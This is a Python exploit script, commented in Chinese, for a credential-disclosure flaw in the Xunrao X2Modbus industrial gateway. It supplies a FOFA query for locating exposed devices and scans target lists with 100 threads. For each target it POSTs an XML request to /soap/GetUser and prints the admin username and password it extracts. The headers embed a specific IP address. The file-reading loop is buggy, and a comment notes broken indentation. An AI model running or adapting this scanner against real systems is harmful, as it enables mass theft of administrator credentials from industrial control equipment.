# 迅饶科技 X2Modbus 网关 GetUser 信息泄露
#账号，密码泄露

# fofa语法：
# server="SunFull-Webs"

import argparse,requests,re,sys
from multiprocessing.dummy import Pool
def main():
	parse = argparse.ArgumentParser(description="迅饶科技信息泄露")
	parse.add_argument('-u','--url',dest="url",help="input url")
	parse.add_argument('-f','--file',dest="file",help="input file path")
	parse = parse.parse_args()

	if parse.url and not parse.file:
		poc(parse.url)
	elif not parse.url and parse.file:
		line = []
		with open(parse.file,"r",encoding="utf-8") as fp:
			for i in fp.readlines():
				fp.write(line.append(i.strip().replace("\n","")))
		mp = Pool(100)
		mp.map(poc,line)
		mp.close()
		mp.join()
	else:
		print(f"Useag:\n\t python {sys.argv[0]} -h")

def poc(target):
	payload_url = '/soap/GetUser'
	url = target+payload_url
	header = {
        "Content-Length":"59",
        "Accept":"application/xml,text/xml,*/*;q=0.01",
        "X-Requested-With":"XMLHttpRequest",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type":"text/xml; charset=UTF-8",
        "Origin": "http://60.12.13.234:880",
        "Referer": "http://60.12.13.234:880/login.html",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Cookie":"language=zh-cn; language=zh-cn",
        "Connection":"close",
    }
	data = """<GetUser><User Name="admin" Password="admin"/></GetUser>"""
	res1 = requests.get(url=target,headers=header,timeout=10)
	# 缩进存在问题
	if res1.status_code == 200:
		try:
			res2 = requests.post(url=url,headers=header,data=data,timeout=10)
			user_match = re.search(r'<UserName>(.*?)</UserName>',res2.text,re.S)
			password_match = re.search(r'<PassWord>(.*?)</PassWord>', res2.text,re.S)
			if 'admin' in user_match.group(1):
				print(f'[+] 该url存在漏洞地址为{target} 泄露的账号:{user_match.group(1)}密码为:{password_match.group(1)}')
            	# print(f'[+] 该url存在漏洞地址为{target} 泄露的账号:{user_match.group(1)}密码为:{password_match.group(1)}')
                # with open('result.txt','a',encoding='utf-8') as f:
                    # f.write(target+'\n')
            # else:
            	# print(22)
                # print(f'[-]该url{target}不存在漏洞')
		except Exception as e:
			pass
   
if __name__ == '__main__':
	main()
